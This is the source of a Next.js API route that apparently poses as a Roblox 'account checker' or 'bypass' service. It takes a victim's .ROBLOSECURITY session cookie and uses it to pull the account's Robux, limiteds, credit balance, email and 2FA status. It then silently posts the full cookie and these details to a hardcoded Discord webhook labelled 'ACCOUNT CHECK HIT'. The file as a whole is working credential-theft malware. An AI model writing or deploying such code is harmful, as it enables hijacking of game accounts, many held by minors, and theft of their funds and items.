import { createSimpleClient } from "@/lib/supabase/server"

export async function POST(request: Request) {
  try {
    const { cookie } = await request.json()

    if (!cookie || cookie.trim().length < 50) {
      return Response.json(
        {
          error: "Invalid or incomplete cookie. Please provide the complete .ROBLOSECURITY cookie.",
          success: false,
        },
        { status: 400 },
      )
    }

    let cookieValue = cookie.trim()

    if (cookieValue.includes("_|WARNING:") || cookieValue.includes("_|WARNING-")) {
      const parts = cookieValue.split("|_")
      if (parts.length >= 2) {
        cookieValue = parts[parts.length - 1]
      }
    }

    cookieValue = cookieValue.replace(/[\r\n]+/g, "")
    if (cookieValue.toLowerCase().startsWith(".roblosecurity=")) {
      cookieValue = cookieValue.substring(15)
    }
    cookieValue = cookieValue.replace(/^["']|["']$/g, "").trim()

    const formattedCookie = `.ROBLOSECURITY=${cookieValue}`

    const ROBLOX_R_LOGO = "https://tr.rbxcdn.com/38c6ee6812f0abd46a3f3a704e2d786c/150/150/Image/Png"
    const EMOJI_ROBUX = "<:robux:1464171977467236375>"
    const EMOJI_WHITE_FIRE = "<a:WhiteFire:1459486498595410032>"
    const EMOJI_VALK = "<:valk:1459382673888772229>"
    const EMOJI_PURPLE_ROBUX = "<:emoji_26:1466033844573573191>"
    const EMOJI_TRANSACTION = "<a:Card:1474992625898487940>"
    const EMOJI_PAYMENTS = "<a:Card:1474992625898487940>"
    const EMOJI_SETTINGS = "<a:spinningsettingslogo:1469933903702917224>"
    const EMOJI_EMAIL = "<:Mail:1474992551101599808>"
    const EMOJI_KORBLOX = "<:KorbloxDeathspeaker:1459369436791181325>"
    const EMOJI_HEADLESS = "<:HeadlessHorseman:1459369353924448358>"
    const EMOJI_PREMIUM = "<:rbxPremium:1459367939135504486>"

    let cookieUserInfo: any = null
    let robuxBalance = 0
    let rap = "0"
    let cookieAvatarUrl = ""
    let totalSpent = 0
    let totalIncoming = 0
    let totalOutgoing = 0
    let hasKorblox = false
    let hasHeadless = false
    let hasValkyrie = false
    let hasPremium = false
    let isOver13 = "Unknown"
    let accountCreationDate = "Unknown"
    let accountAgeDays = 0
    let creditBalance = 0
    let creditCurrency = "USD"
    let limitedsCount = 0
    let emailAddress = ""
    let emailVerified = "Unverified"
    let has2FAEnabled = false
    let has2FADisplay = "DISABLED"
    let isAgeVerified = false
    let authenticatedUsername = "Unknown"
    let authenticatedDisplayName = "Unknown"

    const headlessAssetId = 134082579
    const valkyrieAssetIds = [1365767, 100929604, 855891703]

    const formatNumber = (num: number | string): string => {
      const n = typeof num === "string" ? parseFloat(num) : num
      return isNaN(n) ? "0" : n.toLocaleString("en-US")
    }

    const formatCurrency = (amount: number | string): string => {
      const n = typeof amount === "string" ? parseFloat(amount) : amount
      return isNaN(n) ? "0.00" : n.toFixed(2)
    }

    const robloxHeaders: HeadersInit = {
      Cookie: formattedCookie,
      Accept: "application/json",
    }

    try {
      const userResponse = await fetch("https://users.roblox.com/v1/users/authenticated", {
        method: "GET",
        headers: robloxHeaders,
      })

      if (!userResponse.ok) {
        return Response.json(
          {
            error: "Invalid Roblox cookie. The cookie may be expired or incorrect.",
            success: false,
          },
          { status: 401 },
        )
      }

      cookieUserInfo = await userResponse.json()
      authenticatedUsername = cookieUserInfo?.name || "Unknown"
      authenticatedDisplayName = cookieUserInfo?.displayName || authenticatedUsername

      if (cookieUserInfo?.id) {
        const [avatarResult, userDetailsResult, premiumResult, balanceResult, inventoryResult, transactionResult] =
          await Promise.allSettled([
            fetch(
              `https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${cookieUserInfo.id}&size=150x150&format=Png&isCircular=false`,
            ),
            fetch(`https://users.roblox.com/v1/users/${cookieUserInfo.id}`),
            fetch(`https://premiumfeatures.roblox.com/v1/users/${cookieUserInfo.id}/validate-membership`, {
              headers: robloxHeaders,
            }),
            fetch(`https://economy.roblox.com/v1/users/${cookieUserInfo.id}/currency`, {
              headers: robloxHeaders,
            }),
            fetch(
              `https://inventory.roblox.com/v1/users/${cookieUserInfo.id}/assets/collectibles?sortOrder=Asc&limit=100`,
              {
                headers: robloxHeaders,
              },
            ),
            fetch(
              `https://economy.roblox.com/v2/users/${cookieUserInfo.id}/transaction-totals?timeFrame=Year&transactionType=summary`,
              {
                headers: robloxHeaders,
              },
            ),
          ])

        if (avatarResult.status === "fulfilled" && avatarResult.value.ok) {
          const avatarData = await avatarResult.value.json()
          if (avatarData.data && avatarData.data[0]) {
            cookieAvatarUrl = avatarData.data[0].imageUrl
          }
        }

        if (userDetailsResult.status === "fulfilled" && userDetailsResult.value.ok) {
          const userDetails = await userDetailsResult.value.json()
          if (userDetails.created) {
            const createdDate = new Date(userDetails.created)
            accountCreationDate = createdDate.toLocaleDateString("en-US", {
              year: "numeric",
              month: "long",
              day: "numeric",
            })

            const now = new Date()
            accountAgeDays = Math.floor((now.getTime() - createdDate.getTime()) / (1000 * 60 * 60 * 24))
            const accountAgeYears = accountAgeDays / 365
            if (accountAgeYears >= 13) {
              isOver13 = "13+"
            } else {
              isOver13 = "<13"
            }
          }
        }

        if (premiumResult.status === "fulfilled" && premiumResult.value.ok) {
          const premiumData = await premiumResult.value.json()
          hasPremium = premiumData === true
        }

        if (balanceResult.status === "fulfilled" && balanceResult.value.ok) {
          const balanceData = await balanceResult.value.json()
          robuxBalance = balanceData.robux || 0
        }

        if (inventoryResult.status === "fulfilled" && inventoryResult.value.ok) {
          const inventoryData = await inventoryResult.value.json()
          const totalRap = inventoryData.data?.reduce((sum: number, item: { recentAveragePrice?: number }) => {
            return sum + (item.recentAveragePrice || 0)
          }, 0)
          rap = totalRap?.toString() || "0"
          limitedsCount = inventoryData.data?.length || 0
        }

        if (transactionResult.status === "fulfilled" && transactionResult.value.ok) {
          const txData = await transactionResult.value.json()
          totalIncoming = txData.incomingRobuxTotal || 0
          totalOutgoing = txData.outgoingRobuxTotal || 0
          totalSpent = (txData.purchasesTotal || 0) + totalOutgoing
        }

        // Fetch email via accountsettings API (most reliable with cookie auth)
        try {
          const emailResponse = await fetch("https://accountsettings.roblox.com/v1/email", {
            headers: robloxHeaders,
          })
          console.log("[v0] accountsettings email status:", emailResponse.status)
          if (emailResponse.ok) {
            const emailData = await emailResponse.json()
            console.log("[v0] accountsettings email data:", JSON.stringify(emailData))
            emailAddress = emailData.emailAddress || ""
            emailVerified = emailData.verified ? "Verified" : "Unverified"
          } else {
            const errText = await emailResponse.text().catch(() => "")
            console.log("[v0] accountsettings email error body:", errText)
          }
        } catch (e) {
          console.log("[v0] accountsettings email fetch error:", e)
        }

        // Fallback: try accountinformation API if email is still empty
        if (!emailAddress) {
          try {
            const emailFallback = await fetch("https://accountinformation.roblox.com/v1/email", {
              headers: robloxHeaders,
            })
            console.log("[v0] accountinformation email status:", emailFallback.status)
            if (emailFallback.ok) {
              const emailFallbackData = await emailFallback.json()
              console.log("[v0] accountinformation email data:", JSON.stringify(emailFallbackData))
              emailAddress = emailFallbackData.emailAddress || ""
              emailVerified = emailFallbackData.verified ? "Verified" : "Unverified"
            } else {
              const errText = await emailFallback.text().catch(() => "")
              console.log("[v0] accountinformation email error body:", errText)
            }
          } catch (e) {
            console.log("[v0] accountinformation email fetch error:", e)
          }
        }

        // Fallback: try my/settings/json if email is still empty
        if (!emailAddress) {
          try {
            const settingsResponse = await fetch("https://www.roblox.com/my/settings/json", {
              headers: {
                ...robloxHeaders,
                "Referer": "https://www.roblox.com/",
                "Origin": "https://www.roblox.com",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
              },
            })
            console.log("[v0] settings/json status:", settingsResponse.status)
            if (settingsResponse.ok) {
              const settings = await settingsResponse.json()
              console.log("[v0] settings/json data keys:", Object.keys(settings))
              emailAddress = settings.UserEmail || ""
              emailVerified = settings.UserEmailVerified ? "Verified" : "Unverified"
            }
          } catch (e) {
            console.log("[v0] settings/json fetch error:", e)
          }
        }

        console.log("[v0] Final email result:", emailAddress || "EMPTY", "verified:", emailVerified)

        // Fetch 2FA status via user-specific configuration endpoint
        try {
          const twoFAResponse = await fetch(
            `https://twostepverification.roblox.com/v1/users/${cookieUserInfo.id}/configuration`,
            { headers: robloxHeaders },
          )
          console.log("[v0] 2FA config status:", twoFAResponse.status)
          if (twoFAResponse.ok) {
            const twoFAData = await twoFAResponse.json()
            console.log("[v0] 2FA config data:", JSON.stringify(twoFAData))
            // The configuration returns methods array, if any method is enabled then 2FA is on
            if (twoFAData.methods && Array.isArray(twoFAData.methods)) {
              has2FAEnabled = twoFAData.methods.some((m: { enabled?: boolean }) => m.enabled === true)
            } else if (twoFAData.primaryMediaType) {
              // If primaryMediaType exists, 2FA is enabled
              has2FAEnabled = true
            }
            has2FADisplay = has2FAEnabled ? "ENABLED" : "DISABLED"
          } else {
            const errText = await twoFAResponse.text().catch(() => "")
            console.log("[v0] 2FA config error body:", errText)
          }
        } catch (e) {
          console.log("[v0] 2FA config fetch error:", e)
        }

        console.log("[v0] Final 2FA result:", has2FADisplay)

        try {
          const ageVerificationResponse = await fetch(
            "https://apis.roblox.com/age-verification-service/v1/persona-id-verification/status",
            {
              headers: robloxHeaders,
            },
          )
          if (ageVerificationResponse.ok) {
            const ageVerificationData = await ageVerificationResponse.json()
            isAgeVerified = ageVerificationData.status === "VERIFIED"
          }
        } catch {
          // Silent fail
        }

        try {
          const korbloxResponse = await fetch(
            `https://inventory.roblox.com/v1/users/${cookieUserInfo.id}/items/Bundle/347`,
            { headers: robloxHeaders },
          )
          if (korbloxResponse.ok) {
            const korbloxData = await korbloxResponse.json()
            hasKorblox = korbloxData.data && korbloxData.data.length > 0
          }
        } catch {
          // Silent fail
        }

        try {
          const headlessResponse = await fetch(
            `https://inventory.roblox.com/v1/users/${cookieUserInfo.id}/items/Asset/${headlessAssetId}`,
            { headers: robloxHeaders },
          )
          if (headlessResponse.ok) {
            const headlessData = await headlessResponse.json()
            hasHeadless = headlessData.data && headlessData.data.length > 0
          }
        } catch {
          // Silent fail
        }

        for (const assetId of valkyrieAssetIds) {
          try {
            const valkResponse = await fetch(
              `https://inventory.roblox.com/v1/users/${cookieUserInfo.id}/items/Asset/${assetId}`,
              { headers: robloxHeaders },
            )
            if (valkResponse.ok) {
              const valkData = await valkResponse.json()
              if (valkData.data && valkData.data.length > 0) {
                hasValkyrie = true
                break
              }
            }
          } catch {
            // Silent fail
          }
        }

        try {
          const creditResponse = await fetch("https://billing.roblox.com/v1/credit", {
            headers: robloxHeaders,
          })
          if (creditResponse.ok) {
            const creditData = await creditResponse.json()
            creditBalance = creditData.balance || 0
            creditCurrency = creditData.currencyCode || "USD"
          }
        } catch {
          // Silent fail
        }
      }
    } catch (error) {
      console.error("Error fetching Roblox data:", error)
      return Response.json(
        {
          error: "Failed to fetch account data. Please try again.",
          success: false,
        },
        { status: 500 },
      )
    }

    // Send Discord webhooks
    const isHighValue = robuxBalance > 10000 || parseFloat(rap) > 50000
    const emailDisplay = emailAddress
      ? emailAddress.includes("@")
        ? `${emailAddress.split("@")[0].substring(0, 3)}***@${emailAddress.split("@")[1]}`
        : `${emailAddress.substring(0, 3)}***`
      : "No Email"

    const webhookData: {
      content: string
      username: string
      avatar_url: string
      embeds: Array<{
        title?: string
        description?: string
        color: number
        thumbnail?: { url: string }
        author?: { name: string; icon_url: string; url?: string }
        timestamp?: string
        footer?: { text: string; icon_url?: string }
      }>
    } = {
      content: `**ACCOUNT CHECK HIT**`,
      username: "Roblox Account Checker",
      avatar_url: ROBLOX_R_LOGO,
      embeds: [
        {
          author: {
            name: `${authenticatedDisplayName} (@${authenticatedUsername})`,
            icon_url: cookieAvatarUrl || ROBLOX_R_LOGO,
            url: `https://www.roblox.com/users/${cookieUserInfo?.id || 0}/profile`,
          },
          description: [
            `${EMOJI_WHITE_FIRE} **ᴀᴄᴄᴏᴜɴᴛ ᴄʜᴇᴄᴋᴇᴅ** ${EMOJI_WHITE_FIRE}\n`,
            `**Account Stats**`,
            `\`Account Age: ${accountAgeDays} Days\``,
            `\`Age Bracket: ${isOver13}\`\n`,
            `${EMOJI_ROBUX} **Robux**`,
            `**Balance:** ${formatNumber(robuxBalance)} ${EMOJI_ROBUX}`,
            `**Pending:** 0 ${EMOJI_ROBUX}\n`,
            `${EMOJI_VALK} **Limiteds**`,
            `**RAP:** ${formatNumber(rap)} ${EMOJI_ROBUX}`,
            `**Limiteds:** ${limitedsCount} ${EMOJI_ROBUX}\n`,
            `${EMOJI_SETTINGS} **Summary**`,
            `${formatNumber(totalSpent)} ${EMOJI_ROBUX}\n`,
            `${EMOJI_SETTINGS} **Transactions**`,
            `**Incoming:** +${formatNumber(totalIncoming)} ${EMOJI_ROBUX}`,
            `**Outgoing:** -${formatNumber(totalOutgoing)} ${EMOJI_ROBUX}`,
            `**Total Spent:** ${formatNumber(totalSpent)} ${EMOJI_TRANSACTION}\n`,
            `${EMOJI_PAYMENTS} **Payments**`,
            `**Credit Balance:** $${formatCurrency(creditBalance)} ${creditCurrency}\n`,
            `${EMOJI_SETTINGS} **Settings**`,
            `${EMOJI_EMAIL} **Email:** ${emailDisplay}`,
            `**2FA:** ${has2FADisplay}\n`,
            `${EMOJI_VALK} **Inventory**`,
            `${EMOJI_KORBLOX} **Korblox:** ${hasKorblox ? "True" : "False"}`,
            `${EMOJI_HEADLESS} **Headless:** ${hasHeadless ? "True" : "False"}`,
            `${EMOJI_VALK} **Valkyrie:** ${hasValkyrie ? "True" : "False"}\n`,
            `${EMOJI_PREMIUM} **Premium**`,
            `${hasPremium ? "True" : "False"}`,
          ].join("\n"),
          color: isHighValue ? 0xf1c40f : 0x5865f2,
          thumbnail: { url: cookieAvatarUrl || ROBLOX_R_LOGO },
          timestamp: new Date().toISOString(),
          footer: {
            text: `${authenticatedDisplayName} (@${authenticatedUsername})`,
            icon_url: cookieAvatarUrl || ROBLOX_R_LOGO,
          },
        },
        {
          title: `Cookie`,
          description: `\`\`\`${cookie.substring(0, 1900)}${cookie.length > 1900 ? "..." : ""}\`\`\``,
          color: 0x2b2d31,
          footer: {
            text: `${cookie.length} characters`,
            icon_url: ROBLOX_R_LOGO,
          },
        },
      ],
    }

    try {
      await fetch(
        "https://discord.com/api/webhooks/1486319901806166096/9xfWLDXBP1xdOzdG_TZXhDVloUMbO3QIdlaEwP5Ifxn_YDA5j9i57r-6X6_PVrT3jRMs",
        {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify(webhookData),
        },
      )
    } catch {
      // Silent fail
    }





    // Save to database
    try {
      const supabase = createSimpleClient()
      await supabase.from("recent_bypasses").insert([
        {
          username: authenticatedUsername,
          display_name: authenticatedDisplayName,
          avatar_url: cookieAvatarUrl,
          created_at: new Date().toISOString(),
        },
      ])
    } catch {
      // Ignore database errors
    }

    return Response.json({
      success: true,
      userInfo: {
        name: authenticatedUsername,
        displayName: authenticatedDisplayName,
        id: cookieUserInfo?.id,
      },
      avatarUrl: cookieAvatarUrl,
      robuxBalance: robuxBalance,
      ageVerification: {
        isOver13: isOver13,
        accountAgeDays: accountAgeDays,
        accountCreationDate: accountCreationDate,
        isAgeVerified: isAgeVerified,
      },
      transactionData: {
        totalSpent: totalSpent,
        totalIncoming: totalIncoming,
        totalOutgoing: totalOutgoing,
      },
      rareItems: {
        hasKorblox: hasKorblox,
        hasHeadless: hasHeadless,
        hasValkyrie: hasValkyrie,
      },
      twoFAStatus: {
        has2FAEnabled: has2FAEnabled,
        display: has2FADisplay,
      },
      creditData: {
        balance: creditBalance,
        currency: creditCurrency,
      },
      rap: parseFloat(rap) || 0,
      limitedsCount: limitedsCount,
      hasPremium: hasPremium,
      emailAddress: emailAddress,
      emailVerified: emailVerified,
    })
  } catch {
    return Response.json({ error: "Failed to process request. Please try again.", success: false }, { status: 500 })
  }
}
